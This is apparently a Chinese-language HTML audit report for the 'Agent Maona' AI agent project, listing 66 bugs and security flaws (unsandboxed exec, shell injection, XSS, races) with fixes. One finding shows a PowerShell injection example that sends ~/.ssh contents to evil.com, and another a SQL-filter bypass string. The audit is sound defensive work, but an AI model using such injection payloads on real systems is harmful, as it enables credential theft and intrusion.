@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Agent Maona 全方位诊断报告 — 2026-06-09</title>
+<style>
+  :root {
+    --bg: #f5f5f5; --card-bg: #fff; --text: #333; --text2: #666;
+    --critical: #d32f2f; --high: #e65100; --medium: #f9a825; --low: #2e7d32;
+    --border: #e0e0e0; --code-bg: #f0f0f0;
+    --section-header: #1a237e;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Microsoft YaHei', sans-serif; background: var(--bg); color: var(--text); line-height: 1.6; }
+  .container { max-width: 1100px; margin: 0 auto; padding: 24px 16px; }
+  header { background: linear-gradient(135deg, #1a237e, #283593); color: #fff; padding: 40px 32px; border-radius: 12px; margin-bottom: 24px; }
+  header h1 { font-size: 28px; margin-bottom: 8px; }
+  header .meta { opacity: 0.8; font-size: 14px; }
+  .summary-cards { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; margin-bottom: 24px; }
+  .summary-card { background: var(--card-bg); border-radius: 10px; padding: 20px; text-align: center; box-shadow: 0 2px 8px rgba(0,0,0,0.06); }
+  .summary-card .count { font-size: 36px; font-weight: 700; }
+  .summary-card .label { font-size: 13px; color: var(--text2); margin-top: 4px; }
+  .summary-card.critical .count { color: var(--critical); }
+  .summary-card.high .count { color: var(--high); }
+  .summary-card.medium .count { color: var(--medium); }
+  .summary-card.low .count { color: var(--low); }
+  section { margin-bottom: 28px; }
+  section h2 { font-size: 20px; color: var(--section-header); border-left: 4px solid var(--section-header); padding-left: 12px; margin-bottom: 16px; }
+  .issue-card { background: var(--card-bg); border-radius: 10px; padding: 20px; margin-bottom: 12px; box-shadow: 0 1px 4px rgba(0,0,0,0.04); border-left: 4px solid transparent; }
+  .issue-card.critical { border-left-color: var(--critical); }
+  .issue-card.high { border-left-color: var(--high); }
+  .issue-card.medium { border-left-color: var(--medium); }
+  .issue-card.low { border-left-color: var(--low); }
+  .issue-card .header { display: flex; align-items: center; gap: 10px; margin-bottom: 8px; flex-wrap: wrap; }
+  .issue-card .severity { display: inline-block; padding: 2px 10px; border-radius: 12px; font-size: 11px; font-weight: 700; color: #fff; text-transform: uppercase; }
+  .issue-card .severity.critical { background: var(--critical); }
+  .issue-card .severity.high { background: var(--high); }
+  .issue-card .severity.medium { background: var(--medium); color: #333; }
+  .issue-card .severity.low { background: var(--low); }
+  .issue-card .file { font-family: 'Consolas', 'Courier New', monospace; font-size: 13px; color: var(--text2); }
+  .issue-card .title { font-weight: 600; font-size: 15px; }
+  .issue-card .desc { font-size: 14px; color: var(--text2); margin-bottom: 6px; }
+  .issue-card .code { background: var(--code-bg); padding: 10px 14px; border-radius: 6px; font-family: 'Consolas', 'Courier New', monospace; font-size: 12px; overflow-x: auto; white-space: pre-wrap; margin: 8px 0; }
+  .issue-card .fix { background: #e8f5e9; border-radius: 6px; padding: 8px 14px; font-size: 13px; color: #1b5e20; margin-top: 8px; }
+  .issue-card .fix strong { color: #2e7d32; }
+  .category-tag { display: inline-block; padding: 1px 8px; border-radius: 10px; font-size: 11px; background: #e3f2fd; color: #1565c0; }
+  .stat-bar { display: flex; gap: 4px; margin-top: 20px; }
+  .stat-bar span { padding: 4px 0; border-radius: 2px; }
+  .stat-bar .c { background: var(--critical); width: 10%; }
+  .stat-bar .h { background: var(--high); width: 22%; }
+  .stat-bar .m { background: var(--medium); width: 42%; }
+  .stat-bar .l { background: var(--low); width: 26%; }
+  .footer { text-align: center; color: var(--text2); font-size: 12px; padding: 24px 0; }
+  @media (max-width: 700px) {
+    .summary-cards { grid-template-columns: repeat(2, 1fr); }
+  }
+</style>
+</head>
+<body>
+<div class="container">
+
+<header>
+  <h1>Agent Maona 全方位诊断报告</h1>
+  <div class="meta">诊断日期：2026-06-09 &nbsp;|&nbsp; 诊断范围：全项目（后端/前端/主进程/安全/性能）</div>
+  <div class="stat-bar">
+    <span class="c"></span><span class="h"></span><span class="m"></span><span class="l"></span>
+  </div>
+  <div class="meta" style="margin-top: 8px;">
+    致命 8 | 高危 14 | 中危 25 | 低危 19 | 总计 66 项
+  </div>
+</header>
+
+<div class="summary-cards">
+  <div class="summary-card critical"><div class="count">8</div><div class="label">致命 CRITICAL</div></div>
+  <div class="summary-card high"><div class="count">14</div><div class="label">高危 HIGH</div></div>
+  <div class="summary-card medium"><div class="count">25</div><div class="label">中危 MEDIUM</div></div>
+  <div class="summary-card low"><div class="count">19</div><div class="label">低危 LOW</div></div>
+</div>
+
+<!-- ========== 致命问题 ========== -->
+<section>
+  <h2>致命问题 (CRITICAL) — 必须立即修复</h2>
+
+  <div class="issue-card critical">
+    <div class="header">
+      <span class="severity critical">致命</span>
+      <span class="category-tag">逻辑错误</span>
+      <span class="file">backend/api/chat.py:586-587</span>
+    </div>
+    <div class="title">Agent 工具循环体缩进错误 — 整个 for 循环只有一行代码</div>
+    <div class="desc">
+      <p>这是本次诊断发现的最严重 Bug。<code>for round_i in range(MAX_TOOL_ROUNDS):</code> 的循环体只包含 <code>retry_count = 0</code> 一行。第 588-770 行的所有工具执行代码（LLM 调用、工具分发、结果收集）都不在 for 循环内，而是与 for 同级，仅在 while 循环中执行一次。</p>
+      <p><strong>影响：</strong>Agent 工具循环完全失效。MAX_TOOL_ROUNDS(150) 形同虚设，实际每轮 while 迭代只执行一次工具调用。最大工具轮次从 150 降为 while 的 MAX_AUTO_CONTINUES(5)。多步推理/编程任务可能无法完成。</p>
+    </div>
+    <div class="code"># 当前代码（错误）：
+            for round_i in range(MAX_TOOL_ROUNDS):
+                retry_count = 0  # ← 循环体只有这一行！
+            # 使用当前动态模式...         ← 这一行及以下都不在 for 循环内
+            from tools.dispatcher import get_mode as get_dynamic_mode
+            current_mode = get_dynamic_mode()
+            resp = await provider.chat_non_stream(...)  # 只执行一次</div>
+    <div class="fix"><strong>修复：</strong>将第 588-770 行（从注释到 auto-continue 逻辑前）全部缩进 4 格，使它们成为 for 循环体。然后修复关联的 break/continue 控制流（见下一条）。</div>
+  </div>
+
+  <div class="issue-card critical">
+    <div class="header">
+      <span class="severity critical">致命</span>
+      <span class="category-tag">逻辑错误</span>
+      <span class="file">backend/api/chat.py:788-800</span>
+    </div>
+    <div class="title">Auto-continue 控制流混乱 — 死代码和错误的 break 逻辑</div>
+    <div class="desc">
+      <p>第 795 行的 <code>break</code> 在 <code>continue</code>(793行) 之后，是死代码。第 800 行的 <code>break</code> 与 if/else 同级，但永远不可达（因为 else 分支已经 break，pending 分支已 continue）。</p>
+    </div>
+    <div class="fix"><strong>修复：</strong>重新设计控制流。在修复缩进后，确保：pending=True → continue for 循环；task 真正完成 → break for 循环；task 被截断 → break while 循环。</div>
+  </div>
+
+  <div class="issue-card critical">
+    <div class="header">
+      <span class="severity critical">致命</span>
+      <span class="category-tag">逻辑错误</span>
+      <span class="file">backend/tools/dispatcher.py:288</span>
+    </div>
+    <div class="title">子任务模式过滤完全失效 — sub_tools 被无条件覆写</div>
+    <div class="desc">
+      <p>第 274-281 行按模式（ask/plan/craft）计算受限工具集，但第 288 行 <code>sub_tools = TOOLS</code> 无条件覆写了前面的所有过滤逻辑。子 Agent 无论什么模式都获得全部工具（包括写文件、执行命令）。</p>
+    </div>
+    <div class="fix"><strong>修复：</strong>删除第 288 行，或仅在 implement 模式下赋予完整 TOOLS。</div>
+  </div>
+
+  <div class="issue-card critical">
+    <div class="header">
+      <span class="severity critical">致命</span>
+      <span class="category-tag">安全</span>
+      <span class="file">backend/tools/shell.py:231</span>
+    </div>
+    <div class="title">run_python 使用 exec() 无沙箱执行任意代码</div>
+    <div class="desc">
+      <p><code>exec(code, {"__builtins__": __builtins__})</code> 授予 LLM 生成的代码完整的 Python builtins 权限，可以导入任意模块、读写文件系统、发起网络请求、执行系统命令。</p>
+    </div>
+    <div class="fix"><strong>修复：</strong>使用 RestrictedPython 或 Docker 沙箱，或至少用白名单限制 builtins：<code>{'__builtins__': {'print': print, 'len': len, ...}}</code></div>
+  </div>
+
+  <div class="issue-card critical">
+    <div class="header">
+      <span class="severity critical">致命</span>
+      <span class="category-tag">安全</span>
+      <span class="file">backend/tools/shell.py:429-436</span>
+    </div>
+    <div class="title">notify 函数 PowerShell 命令注入</div>
+    <div class="desc">
+      <p><code>title</code> 和 <code>message</code> 通过 f-string 直接拼入 PowerShell 命令字符串。LLM 生成的内容若包含双引号，可注入任意 PowerShell 代码。</p>
+    </div>
+    <div class="code"># 攻击示例
+title = '"; Invoke-WebRequest http://evil.com -Body (Get-Content ~/.ssh); "'</div>
+    <div class="fix"><strong>修复：</strong>对 title 和 message 进行转义，将 <code>"</code> 替换为 <code>\"</code>。</div>
+  </div>
+
+  <div class="issue-card critical">
+    <div class="header">
+      <span class="severity critical">致命</span>
+      <span class="category-tag">安全</span>
+      <span class="file">backend/tools/creative.py:140</span>
+    </div>
+    <div class="title">定时任务命令通过 shell=True 执行且无过滤</div>
+    <div class="desc">
+      <p><code>subprocess.run(t["command"], shell=True, ...)</code> — 命令来自 LLM 输入，无任何安全过滤。</p>
+    </div>
+    <div class="fix"><strong>修复：</strong>移除 shell=True，使用列表参数；或在执行前验证命令白名单。</div>
+  </div>
+
+  <div class="issue-card critical">
+    <div class="header">
+      <span class="severity critical">致命</span>
+      <span class="category-tag">XSS</span>
+      <span class="file">renderer/js/chat.js:578-594</span>
+    </div>
+    <div class="title">工具参数 JSON.stringify 直接插入 innerHTML — XSS 漏洞</div>
+    <div class="desc">
+      <p>工具调用的 <code>titleText</code>（含参数 JSON）直接拼入 innerHTML，未做 HTML 转义。同样问题存在于 <code>restoreConversationMessages</code>(1227-1237行)。</p>
+    </div>
+    <div class="fix"><strong>修复：</strong>使用 <code>textContent</code> 或实现 <code>escapeHtml()</code> 函数对所有动态内容进行转义。</div>
+  </div>
+
+  <div class="issue-card critical">
+    <div class="header">
+      <span class="severity critical">致命</span>
+      <span class="category-tag">XSS</span>
+      <span class="file">renderer/js/skills.js / sidebar.js / settings.js</span>
+    </div>
+    <div class="title">多处 API 数据直接插入 innerHTML — 系统性 XSS 风险</div>
+    <div class="desc">
+      <p>skills.js(技能名称/描述/正文)、sidebar.js(工作空间名/搜索结果)、settings.js(Provider 名称/URL/知识库名/人设名) 均未对动态内容做 HTML 转义。</p>
+    </div>
+    <div class="fix"><strong>修复：</strong>全局添加 <code>htmlEscape()</code> 工具函数，在所有 innerHTML 拼接点使用。</div>
+  </div>
+</section>
+
+<!-- ========== 高危问题 ========== -->
+<section>
+  <h2>高危问题 (HIGH)</h2>
+
+  <div class="issue-card high">
+    <div class="header"><span class="severity high">高危</span><span class="category-tag">竞态条件</span><span class="file">backend/api/chat.py:70-71, 269-270</span></div>
+    <div class="title">全局变量 _current_request_workspace 在并发请求中数据污染</div>
+    <div class="desc">多个并发请求共享模块级变量，请求 A 的工作空间可能被请求 B 覆盖。</div>
+    <div class="fix"><strong>修复：</strong>使用 contextvars.ContextVar 或函数参数传递。</div>
+  </div>
+
+  <div class="issue-card high">
+    <div class="header"><span class="severity high">高危</span><span class="category-tag">资源泄漏</span><span class="file">backend/api/chat.py:55-56</span></div>
+    <div class="title">AgentLoopSession 和 SESSION_TIMEOUT 完全未使用</div>
+    <div class="desc">AgentLoopSession 类被定义但从未实例化，会话管理机制缺失，_agent_sessions 字典永远不会被填充或清理。</div>
+  </div>
+
+  <div class="issue-card high">
+    <div class="header"><span class="severity high">高危</span><span class="category-tag">竞态条件</span><span class="file">backend/api/chat.py:99-106</span></div>
+    <div class="title">_rate_limits 无锁访问，并发下限流不准确</div>
+  </div>
+
+  <div class="issue-card high">
+    <div class="header"><span class="severity high">高危</span><span class="category-tag">异常处理</span><span class="file">backend/api/chat.py:131-134</span></div>
+    <div class="title">pick_provider 中 get_provider 返回 None 时 TypeError 未被捕获</div>
+    <div class="fix"><strong>修复：</strong>在 cfg 赋值后添加 <code>if not cfg: raise ValueError(...)</code></div>
+  </div>
+
+  <div class="issue-card high">
+    <div class="header"><span class="severity high">高危</span><span class="category-tag">阻塞调用</span><span class="file">backend/api/chat.py:350-353</span></div>
+    <div class="title">Path.read_text() 同步阻塞事件循环</div>
+    <div class="fix"><strong>修复：</strong>使用 aiofiles 或 asyncio.to_thread()。</div>
+  </div>
+
+  <div class="issue-card high">
+    <div class="header"><span class="severity high">高危</span><span class="category-tag">内存</span><span class="file">backend/api/chat.py:523-725</span></div>
+    <div class="title">messages 列表在工具循环中可能无限增长</div>
+  </div>
+
+  <div class="issue-card high">
+    <div class="header"><span class="severity high">高危</span><span class="category-tag">安全</span><span class="file">backend/tools/file_ops.py:277-279</span></div>
+    <div class="title">SQL 注入防护可被注释前缀绕过</div>
+    <div class="desc">仅检查 <code>query.startswith()</code>，可被 <code>/* comment */ DROP TABLE</code> 绕过。</div>
+    <div class="fix"><strong>修复：</strong>使用正则 <code>^\s*SELECT\b</code> 或 SQL 解析器。</div>
+  </div>
+
+  <div class="issue-card high">
+    <div class="header"><span class="severity high">高危</span><span class="category-tag">安全</span><span class="file">backend/tools/file_ops.py:17-33</span></div>
+    <div class="title">FORBIDDEN_DIRS 列表不完整，缺少关键系统目录</div>
+  </div>
+
+  <div class="issue-card high">
+    <div class="header"><span class="severity high">高危</span><span class="category-tag">资源泄漏</span><span class="file">backend/tools/mcp_client.py:114, 131-137</span></div>
+    <div class="title">MCP 子进程启动失败后未清理 — 进程泄漏</div>
+    <div class="desc">初始化超时或 tools/list 失败时直接 return，子进程仍存活且无法被重连。</div>
+  </div>
+
+  <div class="issue-card high">
+    <div class="header"><span class="severity high">高危</span><span class="category-tag">资源泄漏</span><span class="file">backend/tools/browser.py:9-22</span></div>
+    <div class="title">Playwright 进程缺少退出清理机制</div>
+  </div>
+
+  <div class="issue-card high">
+    <div class="header"><span class="severity high">高危</span><span class="category-tag">安全</span><span class="file">backend/tools/shell.py:93</span></div>
+    <div class="title">run_command 使用 create_subprocess_shell 而非 exec</div>
+    <div class="fix"><strong>修复：</strong>改用 create_subprocess_exec 并手动解析参数。</div>
+  </div>
+
+  <div class="issue-card high">
+    <div class="header"><span class="severity high">高危</span><span class="category-tag">阻塞</span><span class="file">backend/tools/shell.py:283, 338, 429-436, 467-473</span></div>
+    <div class="title">多处同步阻塞调用在 async 上下文中</div>
+    <div class="desc">psutil.cpu_percent、webbrowser.open、subprocess.run、pyttsx3 均阻塞事件循环。</div>
+  </div>
+
+  <div class="issue-card high">
+    <div class="header"><span class="severity high">高危</span><span class="category-tag">安全</span><span class="file">main.js:367-381</span></div>
+    <div class="title">preview-html IPC 使用 sandbox: false 创建窗口</div>
+    <div class="desc">预览窗口允许 Node.js 集成，被加载的 HTML 可访问完整系统 API。</div>
+  </div>
+
+  <div class="issue-card high">
+    <div class="header"><span class="severity high">高危</span><span class="category-tag">安全</span><span class="file">main.js:348-356</span></div>
+    <div class="title">open-result IPC 无路径/URL 验证</div>
+  </div>
+</section>
+
+<!-- ========== 中危问题 ========== -->
+<section>
+  <h2>中危问题 (MEDIUM) — 25 项</h2>
+
+  <table style="width:100%; border-collapse:collapse; font-size:13px;">
+    <thead>
+      <tr style="background:#f5f5f5; text-align:left;">
+        <th style="padding:8px; border-bottom:2px solid #e0e0e0;">#</th>
+        <th style="padding:8px; border-bottom:2px solid #e0e0e0;">类别</th>
+        <th style="padding:8px; border-bottom:2px solid #e0e0e0;">文件:行号</th>
+        <th style="padding:8px; border-bottom:2px solid #e0e0e0;">问题描述</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr><td style="padding:6px 8px;">1</td><td>异常处理</td><td style="font-size:12px;">chat.py:244-245</td><td>summarize_conversation 裸吞异常无日志</td></tr>
+      <tr><td style="padding:6px 8px;">2</td><td>异常处理</td><td style="font-size:12px;">chat.py:622-625</td><td>JSON 解析失败静默替换为空 dict</td></tr>
+      <tr><td style="padding:6px 8px;">3</td><td>资源泄漏</td><td style="font-size:12px;">chat.py:62-106</td><td>_rate_limits IP 条目永不清除</td></tr>
+      <tr><td style="padding:6px 8px;">4</td><td>逻辑</td><td style="font-size:12px;">chat.py:496-498</td><td>token 预算只计算 60 条消息，不含注入内容</td></tr>
+      <tr><td style="padding:6px 8px;">5</td><td>安全</td><td style="font-size:12px;">chat.py:304-358</td><td>workspace 路径未验证，路径遍历风险</td></tr>
+      <tr><td style="padding:6px 8px;">6</td><td>安全</td><td style="font-size:12px;">chat.py:350-362</td><td>.maona/system.md 直接注入 prompt，prompt injection 风险</td></tr>
+      <tr><td style="padding:6px 8px;">7</td><td>安全</td><td style="font-size:12px;">chat.py:996-1013</td><td>delete_conv 绕过封装直接操作数据库</td></tr>
+      <tr><td style="padding:6px 8px;">8</td><td>竞态</td><td style="font-size:12px;">chat.py:1101-1117</td><td>_tool_state 全局变量无锁保护</td></tr>
+      <tr><td style="padding:6px 8px;">9</td><td>资源</td><td style="font-size:12px;">chat.py:86-96</td><td>确认等待 Future 可能泄漏</td></tr>
+      <tr><td style="padding:6px 8px;">10</td><td>资源</td><td style="font-size:12px;">chat.py:584-925</td><td>大 try/except 范围，conv_id 可能未定义</td></tr>
+      <tr><td style="padding:6px 8px;">11</td><td>阻塞</td><td style="font-size:12px;">chat.py:280-285</td><td>socket.connect_ex 同步阻塞 1 秒</td></tr>
+      <tr><td style="padding:6px 8px;">12</td><td>逻辑</td><td style="font-size:12px;">dispatcher.py:274-288</td><td>子任务模式过滤被无条件覆写（致命问题已单独列）</td></tr>
+      <tr><td style="padding:6px 8px;">13</td><td>逻辑</td><td style="font-size:12px;">dispatcher.py:317</td><td>会话 ID 被当作文件路径 resolve</td></tr>
+      <tr><td style="padding:6px 8px;">14</td><td>逻辑</td><td style="font-size:12px;">knowledge.py:460-463</td><td>if True: 永远为真，mode 变量死代码</td></tr>
+      <tr><td style="padding:6px 8px;">15</td><td>安全</td><td style="font-size:12px;">shell.py:36-50</td><td>危险命令正则过滤可被 Unicode 绕过</td></tr>
+      <tr><td style="padding:6px 8px;">16</td><td>资源</td><td style="font-size:12px;">shell.py:238-251</td><td>线程池 shutdown(wait=False) 丢弃线程</td></tr>
+      <tr><td style="padding:6px 8px;">17</td><td>资源</td><td style="font-size:12px;">shell.py:478-486</td><td>text_to_speech 临时文件异常时泄漏</td></tr>
+      <tr><td style="padding:6px 8px;">18</td><td>资源</td><td style="font-size:12px;">mcp_client.py:170-175</td><td>_mcp_send 清空缓冲区可能丢失响应</td></tr>
+      <tr><td style="padding:6px 8px;">19</td><td>资源</td><td style="font-size:12px;">mcp_client.py:208-209</td><td>_mcp_error_log 无上限增长</td></tr>
+      <tr><td style="padding:6px 8px;">20</td><td>资源</td><td style="font-size:12px;">mcp_client.py:278-293</td><td>_ensure_connected_force 死锁风险</td></tr>
+      <tr><td style="padding:6px 8px;">21</td><td>内存</td><td style="font-size:12px;">chat.js:1058-1110</td><td>全局事件监听器未移除</td></tr>
+      <tr><td style="padding:6px 8px;">22</td><td>状态</td><td style="font-size:12px;">chat.js:931-953</td><td>isStreaming 与 chatStream 初始化竞态</td></tr>
+      <tr><td style="padding:6px 8px;">23</td><td>错误处理</td><td style="font-size:12px;">api.js:149-158</td><td>ReaderError 通过字符串检查分类，脆弱</td></tr>
+      <tr><td style="padding:6px 8px;">24</td><td>状态</td><td style="font-size:12px;">sidebar.js:273-308</td><td>restoreHistory 并发 DOM 冲突</td></tr>
+      <tr><td style="padding:6px 8px;">25</td><td>性能</td><td style="font-size:12px;">chat.js:829-843</td><td>每次 token 重新解析整个 Markdown</td></tr>
+    </tbody>
+  </table>
+</section>
+
+<!-- ========== 低危问题 ========== -->
+<section>
+  <h2>低危问题 (LOW) — 19 项</h2>
+
+  <table style="width:100%; border-collapse:collapse; font-size:13px;">
+    <thead>
+      <tr style="background:#f5f5f5; text-align:left;">
+        <th style="padding:8px; border-bottom:2px solid #e0e0e0;">#</th>
+        <th style="padding:8px; border-bottom:2px solid #e0e0e0;">类别</th>
+        <th style="padding:8px; border-bottom:2px solid #e0e0e0;">文件:行号</th>
+        <th style="padding:8px; border-bottom:2px solid #e0e0e0;">问题描述</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr><td>1</td><td>逻辑</td><td style="font-size:12px;">chat.py:535-545</td><td>ocr_base64 空 URL 仍被调用</td></tr>
+      <tr><td>2</td><td>弃用 API</td><td style="font-size:12px;">chat.py:88</td><td>asyncio.get_event_loop() 在 3.10+ 弃用</td></tr>
+      <tr><td>3</td><td>死代码</td><td style="font-size:12px;">chat.py:55-56</td><td>SESSION_TIMEOUT 定义但从未使用</td></tr>
+      <tr><td>4</td><td>重复定义</td><td style="font-size:12px;">chat.py:12, 59</td><td>MAX_TOOL_ROUNDS / AGENT_MAX_ROUNDS 重复</td></tr>
+      <tr><td>5</td><td>配置</td><td style="font-size:12px;">chat.py:172</td><td>默认 1M token 预算对小模型有风险</td></tr>
+      <tr><td>6</td><td>不一致</td><td style="font-size:12px;">chat.py:12, 174</td><td>COMPRESS_THRESHOLD 与 config.py 不一致</td></tr>
+      <tr><td>7</td><td>异常处理</td><td style="font-size:12px;">chat.py:340-341</td><td>对话摘要注入异常被静默吞掉</td></tr>
+      <tr><td>8</td><td>类型</td><td style="font-size:12px;">chat.py:714</td><td>resp.get("content") or None — falsy 值处理</td></tr>
+      <tr><td>9</td><td>死代码</td><td style="font-size:12px;">dispatcher.py:453-454</td><td>return 后不可达代码</td></tr>
+      <tr><td>10</td><td>逻辑</td><td style="font-size:12px;">dispatcher.py:89</td><td>task_update 中 step=0 被当作 falsy 跳过</td></tr>
+      <tr><td>11</td><td>编码</td><td style="font-size:12px;">memory_tools.py:103</td><td>import os 非标准位置</td></tr>
+      <tr><td>12</td><td>逻辑</td><td style="font-size:12px;">knowledge.py:38</td><td>裸 except 捕获所有异常</td></tr>
+      <tr><td>13</td><td>硬编码</td><td style="font-size:12px;">mcp_client.py:94, 123</td><td>硬编码 sleep 0.5 等待初始化</td></tr>
+      <tr><td>14</td><td>XSS</td><td style="font-size:12px;">memory.js:16</td><td>日志内容未转义</td></tr>
+      <tr><td>15</td><td>XSS</td><td style="font-size:12px;">sidebar.js:432</td><td>_confirm msg 参数未净化</td></tr>
+      <tr><td>16</td><td>废弃 API</td><td style="font-size:12px;">chat.js:1355</td><td>document.execCommand("copy") 已废弃</td></tr>
+      <tr><td>17</td><td>状态</td><td style="font-size:12px;">sidebar.js:78-95</td><td>待处理工作空间崩溃时丢失</td></tr>
+      <tr><td>18</td><td>性能</td><td style="font-size:12px;">settings.js:466-471</td><td>文档加载使用顺序循环</td></tr>
+      <tr><td>19</td><td>兼容性</td><td style="font-size:12px;">main.js:290</td><td>托盘图标 16x16 在 HiDPI 下模糊</td></tr>
+    </tbody>
+  </table>
+</section>
+
+<!-- ========== 附加发现 ========== -->
+<section>
+  <h2>附加发现</h2>
+
+  <div class="issue-card medium">
+    <div class="header"><span class="severity medium">中危</span><span class="category-tag">杂项</span><span class="file">renderer/js/gen.js</span></div>
+    <div class="title">gen.js 是 Node.js 构建脚本但放在 renderer 目录中可能被 HTTP 暴露</div>
+    <div class="desc">此文件使用 <code>require('fs')</code> 和 <code>require('electron')</code>，是构建工具而非前端代码。放在 renderer/js/ 中可通过 HTTP 访问，存在信息泄露风险。</div>
+    <div class="fix"><strong>修复：</strong>移出 renderer 目录，或添加到静态文件黑名单。</div>
+  </div>
+
+  <div class="issue-card medium">
+    <div class="header"><span class="severity medium">中危</span><span class="category-tag">杂项</span><span class="file">根目录 nul</span></div>
+    <div class="title">根目录存在 72 字节的 nul 文件 — 命令残留</div>
+    <div class="desc">内容为 "ERROR: Invalid argument..."，是 taskkill 命令的 stderr 被错误重定向到文件 "nul" 而非 NUL 设备的产物。</div>
+    <div class="fix"><strong>修复：</strong>删除该文件，检查启动脚本中的重定向语法。</div>
+  </div>
+
+  <div class="issue-card low">
+    <div class="header"><span class="severity low">低危</span><span class="category-tag">技术债</span><span class="file">backend/api/tools.py</span></div>
+    <div class="title">api/tools.py 为空文件，工具逻辑在 chat.py 底部</div>
+    <div class="desc">路由分离不完整，工具管理端点散落在 chat.py:1101-1379 行。</div>
+  </div>
+
+  <div class="issue-card low">
+    <div class="header"><span class="severity low">低危</span><span class="category-tag">技术债</span><span class="file">backend/api/chat.py</span></div>
+    <div class="title">chat.py 文件过长 (1400+ 行)，需拆分</div>
+    <div class="desc">包含会话管理、工具管理、对话流控制、记忆注入、摘要压缩等职责，违反了单一职责原则。</div>
+  </div>
+
+  <div class="issue-card low">
+    <div class="header"><span class="severity low">低危</span><span class="category-tag">技术债</span><span class="file">test_mcp_full.py</span></div>
+    <div class="title">测试文件硬编码 F:\工具\Agent_maona\ 绝对路径</div>
+    <div class="desc">在其他机器或不同路径下会失败。</div>
+  </div>
+</section>
+
+<!-- ========== 修复路线图 ========== -->
+<section>
+  <h2>修复优先级路线图</h2>
+
+  <div class="issue-card" style="border-left-color: var(--critical); border-left-width: 4px;">
+    <div class="header"><span class="severity critical">第一优先级</span></div>
+    <div class="desc" style="margin-top:8px;">
+      <ol style="padding-left:20px; line-height:2;">
+        <li><strong>修复 chat.py:586 的 for 循环缩进</strong> — 这是让 Agent 正常工作的前提</li>
+        <li><strong>修复 chat.py:788-800 的 auto-continue 控制流</strong> — 与缩进修复联动</li>
+        <li><strong>修复 dispatcher.py:288 的子任务工具过滤</strong> — 安全性</li>
+        <li><strong>全局添加 HTML 转义函数</strong> — 修复所有 XSS 漏洞</li>
+        <li><strong>修复 shell.py exec() 沙箱问题</strong> — 关键安全漏洞</li>
+        <li><strong>修复 shell.py PowerShell 命令注入</strong></li>
+      </ol>
+    </div>
+  </div>
+
+  <div class="issue-card" style="border-left-color: var(--high); border-left-width: 4px;">
+    <div class="header"><span class="severity high">第二优先级</span></div>
+    <div class="desc" style="margin-top:8px;">
+      <ol start="7" style="padding-left:20px; line-height:2;">
+        <li>修复全局变量竞态条件（contextvars 替代）</li>
+        <li>修复 MCP 子进程泄漏和浏览器进程清理</li>
+        <li>修复 SQL 注入过滤绕过</li>
+        <li>修复 Electron 沙箱配置不一致</li>
+        <li>添加路径验证</li>
+        <li>修复阻塞调用</li>
+      </ol>
+    </div>
+  </div>
+
+  <div class="issue-card" style="border-left-color: var(--medium); border-left-width: 4px;">
+    <div class="header"><span class="severity medium">第三优先级</span></div>
+    <div class="desc" style="margin-top:8px;">
+      <ol start="13" style="padding-left:20px; line-height:2;">
+        <li>添加异常日志（消除裸 except）</li>
+        <li>清理资源泄漏（速率限制 IP、事件监听器）</li>
+        <li>修复内存泄漏（全局事件监听器）</li>
+        <li>改进错误处理（token 获取失败通知用户）</li>
+      </ol>
+    </div>
+  </div>
+
+  <div class="issue-card" style="border-left-color: var(--low); border-left-width: 4px;">
+    <div class="header"><span class="severity low">第四优先级</span></div>
+    <div class="desc" style="margin-top:8px;">
+      <ol start="17" style="padding-left:20px; line-height:2;">
+        <li>清理死代码和重复定义</li>
+        <li>移除 gen.js 或移出 renderer</li>
+        <li>拆分 chat.py</li>
+        <li>修复 HiDPI 图标和废弃 API</li>
+      </ol>
+    </div>
+  </div>
+</section>
+
+<div class="footer">
+  <p>诊断工具：WorkBuddy Diagnose Skill &nbsp;|&nbsp; 项目：Agent Maona v0.7 &nbsp;|&nbsp; 路径：F:\工具\Agent_maona</p>
+  <p style="margin-top:4px;">诊断耗时：全项目范围，3 个并发 Agent 审计，覆盖~8000 行代码</p>
+</div>
+
+</div>
+</body>
+</html>
